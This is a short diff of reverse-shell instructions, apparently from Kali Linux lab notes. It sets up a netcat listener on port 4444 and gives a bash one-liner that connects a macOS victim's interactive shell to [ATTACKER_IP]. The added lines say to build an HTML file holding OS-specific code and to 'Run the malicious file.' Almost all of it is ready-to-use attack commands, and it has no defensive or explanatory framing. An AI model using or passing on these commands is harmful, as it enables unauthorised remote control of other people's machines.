@@ -2,7 +2,12 @@
 # KALI LINUX #
   // Set up listener on Kali Linux
   nc -lvp 4444
-
+	// Create an HTML file with the corresponding Operating System code.
+	sudo su
+	mkdir "name"
+	cd "name"
+	nano "file_name".html
+	Paste the corresponding Operating System code:
 [VICTIM MACHINE]
 # UBUNTU #
   // Start a reverse shell on Ubuntu victim machine
@@ -15,6 +20,8 @@
 # MAC OS #
   // Start a reverse shell on macOS victim machine
   bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1"
+
+Run the malicious file.
 
 Important Notes:
 Firewall Considerations: Ensure that any firewalls (both on the attacker and victim sides) allow traffic on port 4444.
